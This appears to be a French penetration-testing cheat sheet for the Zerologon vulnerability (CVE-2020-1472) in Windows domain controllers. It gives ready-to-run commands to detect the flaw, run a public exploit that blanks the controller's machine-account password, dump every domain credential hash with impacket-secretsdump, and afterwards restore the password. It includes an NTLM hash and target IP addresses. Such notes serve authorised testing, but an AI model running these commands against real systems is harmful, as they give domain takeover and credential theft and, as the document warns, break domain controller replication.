https://www.secura.com/blog/zero-logon
# CVE-2020-1472

> [!WARNING]
> Change le mot de passe de compte de machine du DC et donc coupe la communication entre les DC !!! 

> [!TIP]
> Permet de DCSYNC


1. Identifier si target vulnérable

```bash
nxc smb <ip> -u '' -p '' -M zerologon
```

## Exploit

https://github.com/dirkjanm/CVE-2020-1472


1. Exploit

```bash
python3 cve-2020-1472-exploit.py DC-NAME dc-ip
```

2. Constater l'authent avec le compte de machine sans mot de passe

```sh
nxc smb 192.168.56.12 -u 'meereen$' -p ''
```

3. DCSYNC

```bash
sudo impacket-secretsdump 'DC-ZEROLOGON$'@163.172.195.64 -just-dc -no-pass -user-status -history -pwd-last-set -outputfile DOMAIN_hashes
```

 
## Restaurer le mot de passe du compte de machine

1. Faire un VSS du volume C:\ afin d'extraire le plain_password_hex du compte de machine depuis les ruches (avec compte admin du domaine)

```bash
sudo impacket-secretsdump -hashes :777b1935ff37faba2b2c299288b0693b Administrator@212.129.29.187 -remoteSS-remote-volume c:\ -no-pass
```

2. Restaurer mot de passe à l'aide du Hex

```bash
sudo python3 restorepassword.py domain/dc@dc -target-ip <ip_dc> -hexpass <plain_password_hex>
```

3. Vérifier qu'on ne peut plus s'authentifier sans mot de passe

```sh
nxc smb 192.168.56.12 -u 'meereen$' -p ''
```

